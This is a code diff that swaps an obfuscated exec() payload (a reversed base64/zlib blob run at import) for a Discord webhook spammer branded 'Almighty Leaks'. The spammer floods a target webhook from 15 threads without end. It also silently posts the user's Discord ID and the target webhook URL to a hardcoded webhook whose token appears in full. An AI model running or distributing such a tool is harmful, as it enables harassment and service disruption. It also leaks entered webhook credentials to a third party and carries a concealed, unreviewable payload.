@@ -1,4 +1,110 @@
+import requests
+import threading
+import time
+import re
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+# ASCII Art Banner for "Almighty Leaks"
+ascii_banner = r"""
+     _    _      _ _       _       _             
+    / \  | |    | | |     | |     | |            
+   / _ \ | |    | | |     | |     | |            
+  / ___ \| |___ | | | ___ | | ___ | | ___         
+ /_/   \_\_____|_|_| \___|_|_| \___|_|/___|       
+                                                  
+"""
+
+# Main Menu Banner (can be replaced with any ASCII art/image)
+menu_image = r"""
+*************************************************
+*                                               *
+*           WELCOME TO THE SPAMMER               *
+*             (MADE BY KENZIE)                   *
+*               discord.gg/ALMIGHTYLEAKS        *
+*                                               *
+*************************************************
+"""
+
+# Log Webhook URL (replace with your actual log channel webhook URL)
+LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1440350168359633107/Kfi5zjJB2Qi8AJPK50x4EsjPxrU1EPRkF3w43KyzGxejle0HyEVeZjrO-p4bnkALs9LO"
+
+def is_valid_discord_id(user_id):
+    return re.match(r"^\d{17,19}$", user_id) is not None
+
+def is_valid_webhook_url(url):
+    pattern = r"^https:\/\/(canary\.)?discord(app)?\.com\/api\/webhooks\/\d+\/[\w-]+$"
+    return re.match(pattern, url) is not None
+
+def send_log(spammer_id, used_webhook, avatar_url, message):
+    user_mention = f"<@{spammer_id}>"
+    log_content = (
+        f"🔴 **Spam Attempt Logged**\n"
+        f"Spammer: {user_mention}\n"
+        f"Webhook Used: {used_webhook}\n"
+        f"Avatar URL: {avatar_url}\n"
+        f"Message: {message}\n"
+        f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    try:
+        response = requests.post(LOG_WEBHOOK_URL, json={"content": log_content})
+        if response.status_code not in [200, 204]:
+            print("Failed to send log to Discord.")
+    except requests.exceptions.RequestException:
+        print("Error sending log to Discord.")
+
+def spam_webhook(webhook, message, username, avatar_url):
+    session = requests.Session()
+    while True:
+        try:
+            session.post(webhook, json={
+                "content": message,
+                "username": username,
+                "avatar_url": avatar_url
+            })
+        except requests.exceptions.RequestException:
+            pass
+        time.sleep(0.5)
+
+def start_spammer():
+    print(ascii_banner)
+    print(menu_image)  # Display the "image" at the start of the menu
+
+    # Prompt for Webhook URL
+    while True:
+        webhook = input("[\033[95m>\033[37m] Webhook URL: ").strip()
+        if is_valid_webhook_url(webhook):
+            break
+        else:
+            print("\033[91mInvalid Webhook URL. Please enter a valid Discord webhook URL.\033[0m")
+
+    # Prompt for Message
+    message = input("[\033[94m>\033[37m] Message: ").strip()
+
+    # Prompt for Webhook Username
+    username = input("[\033[95m>\033[37m] Webhook Username?: ").strip()
+    if not username:
+        username = "Spammer"
+
+    # Prompt for Avatar URL (optional)
+    avatar_url = input("[\033[95m>\033m] Avatar Image URL? (leave blank if none): ").strip()
+
+    # Prompt for Spammer User ID
+    while True:
+        spammer_id = input("[\033[95m>\033[37m] Your Discord User ID: ").strip()
+        if is_valid_discord_id(spammer_id):
+            break
+        else:
+            print("\033[91mInvalid Discord ID. Please enter a numeric User ID (17-19 digits).\033[0m")
+
+    # Send initial log
+    send_log(spammer_id, webhook, avatar_url, message)
+
+    # Start spam threads
+    for _ in range(15):
+        threading.Thread(target=spam_webhook, args=(webhook, message, username, avatar_url), daemon=True).start()
+
+    print("\n\033[92m[+] Webhook spammer started!\033[0m\n")
+    while True:
+        time.sleep(1)
+
+# Run the spammer
+start_spammer()
